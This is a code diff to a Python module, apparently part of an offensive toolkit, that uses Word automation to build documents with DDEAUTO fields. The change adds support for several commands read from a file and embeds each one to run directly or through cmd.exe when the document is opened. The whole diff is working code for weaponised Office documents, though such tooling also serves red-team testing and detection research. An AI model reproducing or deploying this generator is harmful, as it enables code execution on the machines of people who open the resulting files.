@@ -9,6 +9,7 @@ if sys.platform == "win32":
     import win32com.client # @UnresolvedImport
 
 import logging
+import shlex
 from modules.word_gen import WordGenerator
 
 
@@ -22,11 +23,25 @@ class WordDDE(WordGenerator):
     def run(self):
         logging.info(" [+] Generating MS Word with DDE document...")
         try:
+            cmdFile = self.getCMDFile()
+            valuesFileContent = ""
+            if cmdFile:
+                with open(cmdFile, 'r') as f:
+                    valuesFileContent = f.read().rstrip()
+
             # Get command line
             paramDict = OrderedDict([("Cmd_Line",None)])      
             self.fillInputParams(paramDict)
             command = paramDict["Cmd_Line"]
-            
+
+            commands = []
+            if cmdFile and valuesFileContent:
+                for l in valuesFileContent.splitlines():
+                    if l:
+                        commands.append(l)
+            else:
+                commands.append(command)
+
             logging.info("   [-] Open document...")
             # open up an instance of Word with the win32com driver
             word = win32com.client.Dispatch("Word.Application")
@@ -34,11 +49,33 @@ class WordDDE(WordGenerator):
             word.Visible = False
             document = word.Documents.Open(self.outputFilePath)
     
-            logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
+            logging.info("   [-] Inject DDE field...")
+
+            ddeCmds = []
+            for command in commands:
+                ddeCmd = ""
+                if command[1] == ":" or command[2] == ":": # command's image is an absolute path, possibly quoted
+                    image = shlex.split(command, posix=False)[0]# possibly qouted
+                    argumentsString = (image+" ").join(command.split(image+" ")[1:])
+                    def escape_qoutes(c):
+                        return c.replace('"', '\\"')
+                    def escape_backslashes(c):
+                        return c.replace('\\', '\\\\')
+                    image = escape_backslashes(image)
+                    image = escape_qoutes(image)
+                    argumentsString = escape_backslashes(argumentsString)
+                    argumentsString = escape_qoutes(argumentsString)
+                    ddeCmd = '"%s" "%s" "."' % (image.rstrip(), argumentsString.rstrip())
+                else:
+                    logging.info("   [-] Using cmd.exe to execute the desired command")
+                    ddeCmd = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command.rstrip()
+                ddeCmds.append(ddeCmd)
             
-            ddeCmd = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command.rstrip()
             wdFieldDDEAuto=46
-            document.Fields.Add(Range=word.Selection.Range,Type=wdFieldDDEAuto, Text=ddeCmd, PreserveFormatting=False)
+            for ddeCmd in reversed(ddeCmds):
+                field = document.Fields.Add(Range=word.Selection.Range,Type=wdFieldDDEAuto, Text='', PreserveFormatting=False)
+                field.Code.Text = r'DDEAUTO ' + ddeCmd 
+                logging.info("   [-] The DDE being used is: %s" % field.Code.Text)
             
             # save the document and close
             word.DisplayAlerts=False
